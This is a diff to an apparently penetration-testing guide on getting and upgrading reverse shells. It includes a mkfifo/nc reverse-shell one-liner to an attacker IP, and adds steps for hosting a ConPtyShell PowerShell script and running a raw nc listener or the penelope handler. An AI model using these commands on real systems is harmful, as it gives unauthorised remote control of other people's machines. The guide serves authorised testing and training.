@@ -99,3 +99,30 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.xxx.xxx 9
 
 Now you should have a shell with autocomplete, history, and better usability features.
 
+To have autocomplete on a Windows machine, you can also use:
+
+- <a href="https://github.com/antonioCoco/ConPtyShell" target="_blank">ConPtyShell</a>
+
+## A simple guide how you could use it:
+
+To upgrade to an advanced shell on a Windows target using PowerShell, you can leverage the ConPtyShell method. Below is an example workflow for hosting and running the script:
+
+On Kali Linux (Attacker's Machine)
+```bash
+# Host the PowerShell script
+python3 -m http.server 80  
+# to host Invoke-ConPtyShell.ps1
+
+# In another terminal on Kali
+stty raw -echo; (stty size; cat) | nc -lvnp 9001
+```
+
+To have autocomplete on a Linux machine, you can also use:
+
+- <a href="https://github.com/brightio/penelope" target="_blank">penelope</a>
+```shell
+# Clone the repo, go to the directory and use the command:
+./penelope.py 5555 -i eth0
+
+# For more guidance, go to the repo.
+```
